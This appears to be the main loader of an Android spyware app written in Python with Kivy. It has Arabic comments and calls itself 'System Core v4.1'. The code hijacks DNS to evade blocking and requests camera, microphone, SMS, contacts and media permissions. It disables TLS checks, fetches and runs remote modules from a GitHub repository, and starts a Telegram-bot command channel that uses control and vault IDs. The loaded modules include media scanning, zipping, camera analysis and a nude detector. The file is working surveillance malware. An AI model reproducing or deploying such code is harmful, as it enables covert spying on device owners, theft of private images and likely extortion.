# -*- coding: utf-8 -*-
import os
import sys
import threading
import importlib
import requests
import traceback
import gc
import time
import socket
import random
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== 1. تجاوز DNS (شامل api.telegram.org) ==========
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo
    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        override = {
            'raw.githubusercontent.com': [
                '185.199.108.133', '185.199.109.133',
                '185.199.110.133', '185.199.111.133'
            ],
            'api.telegram.org': [
                '149.154.167.220', '149.154.167.221',
                '149.154.167.99', '149.154.175.50'
            ],
            'zaen1993.github.io': [
                '185.199.108.153', '185.199.109.153',
                '185.199.110.153', '185.199.111.153'
            ],
            'cdn.jsdelivr.net': [
                '151.101.2.229', '151.101.66.229', '151.101.130.229'
            ]
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)
    socket.getaddrinfo = patched_getaddrinfo

_patch_dns()

# ========== 2. روابط index.json (مع إلغاء التخزين المؤقت) ==========
INDEX_BASE_URLS = [
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json"
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

# ========== 3. المسارات الأساسية ==========
def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except Exception:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)

HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)

if R not in sys.path:
    sys.path.insert(0, R)

# ========== 4. الأذونات واستثناء البطارية ==========
def _perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.WAKE_LOCK,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO"
        ])
    except Exception as e:
        print(f"Permissions error: {e}")

    try:
        from jnius import autoclass
        PowerManager = autoclass('android.os.PowerManager')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        print(f"Battery exemption error: {e}")

# ========== 5. تطبيق Kivy الرئيسي ==========
class CoreApp(App):
    def build(self):
        self.title = "System Core v4.1"
        layout = BoxLayout(orientation='vertical', spacing=5)

        self.log = TextInput(
            text="", readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1),
            font_size='10sp'
        )

        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)

        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)

        layout.add_widget(self.log)
        layout.add_widget(btns)

        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, _):
        Clipboard.copy(self.log.text)
        self._log("Log copied to clipboard")

    def _clear(self, _):
        self.log.text = ""

    def _log(self, msg, lvl="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        def upd(dt):
            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
            if len(self.log.text) > 15000:
                self.log.text = self.log.text[-8000:]
            self.log.cursor = (0, len(self.log.text))
        Clock.schedule_once(upd, 0)

    def _verify_module(self, file_path, module_name):
        if not os.path.exists(file_path):
            return False
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            if len(content) < 200:
                return False
            compile(content, module_name, 'exec')
            return True
        except Exception as e:
            self._log(f"Verification error ({module_name}): {e}", "ERROR")
            return False

    def _download_safe(self, url, filename):
        final_path = os.path.join(R, filename)
        # إضافة معامل زمني لتجاوز الكاش (cache‑busting)
        url_with_cache_buster = f"{url}?t={int(time.time())}"
        try:
            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20, verify=False)
            if resp.status_code == 200 and len(resp.content) > 200:
                with open(final_path, 'wb') as f:
                    f.write(resp.content)
                return True
        except Exception as e:
            self._log(f"Download error for {filename}: {e}", "WARN")
        return False

    def _start(self, _):
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        _perms()
        self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")

        # --- 1. جلب index.json (مع منع التخزين المؤقت) ---
        all_files = []
        for base_url in INDEX_BASE_URLS:
            try:
                url = f"{base_url}?t={int(time.time())}"
                self._log(f"Trying index: {url.split('/')[2]}...")
                resp = requests.get(url, headers=HEADERS, timeout=15, verify=False)
                if resp.status_code == 200:
                    data = resp.json()
                    all_files = data.get('files', [])
                    self._log(f"📄 Found {len(all_files)} files from {base_url.split('/')[2]}")
                    break
                else:
                    self._log(f"Index returned HTTP {resp.status_code}", "WARN")
            except Exception as e:
                self._log(f"Index error: {e}", "WARN")
        else:
            self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")

        # --- 2. تحميل الملفات (باستثناء main.py) ---
        for file_url in all_files:
            filename = file_url.split('/')[-1]
            if filename == "main.py":
                continue
            self._download_safe(file_url, filename)

        time.sleep(1)

        # --- 3. تنظيف الموديولات القديمة من الذاكرة ---
        self._log("🧹 Cleaning memory...")
        modules_to_remove = [
            "monitor", "telegram_ui", "commands",
            "media_scanner", "daily_zipper", "gallery_browser",
            "camera_analyzer", "nude_detector"
        ]
        for mod in modules_to_remove:
            if mod in sys.modules:
                del sys.modules[mod]
        # إعادة تحميل الموديولات بعد مسح الكاش
        importlib.invalidate_caches()
        gc.collect()

        # --- 4. تحميل الأسرار من config.py ---
        telegram_path = os.path.join(R, "telegram_ui.py")
        if not os.path.exists(telegram_path):
            self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
            return

        try:
            import config
            importlib.reload(config)
            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = config.load_config()
            self._log("🔐 Configuration loaded securely.")
        except Exception as e:
            self._log(f"❌ Failed to load config: {e}", "ERROR")
            return

        # --- 5. إقلاع النظام الأساسي ---
        try:
            import monitor
            import telegram_ui
            import commands

            importlib.reload(monitor)
            importlib.reload(telegram_ui)
            importlib.reload(commands)

            UI_Class = getattr(telegram_ui, 'T', None)
            if UI_Class:
                mon = monitor.M()
                random.seed(mon.did)
                self._log(f"🆔 Device ID: {mon.did[:8]}... | Cluster seed set")

                ui = UI_Class(
                    m=mon,
                    active_tokens=active_tokens,
                    reserve_tokens=reserve_tokens,
                    ctrl_id=ctrl_id,
                    vault_id=vault_id,
                    app_password=secret_password
                )
                mon.ui = ui
                mon.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, mon, cid, cbq)

                ui.start()
                mon.start()
                self._log("🎉 SYSTEM ONLINE (Anti-Block Mode)", "SUCCESS")
                self._log(f"Device: {mon.did} | Model: {mon.dmd}")
                self._log(f"Active bots: {len(active_tokens)} | Reserve: {len(reserve_tokens)}")
            else:
                self._log("❌ Class 'T' missing in telegram_ui.py", "ERROR")
        except Exception as e:
            self._log(f"FATAL ERROR: {e}", "ERROR")
            self._log(traceback.format_exc(), "TRACE")
            Clock.schedule_once(lambda dt: self._start(None), 60)

    def on_pause(self):
        return True

    def on_stop(self):
        self._log("App stopped. Restarting service if needed.")
        return True

if __name__ == '__main__':
    CoreApp().run()
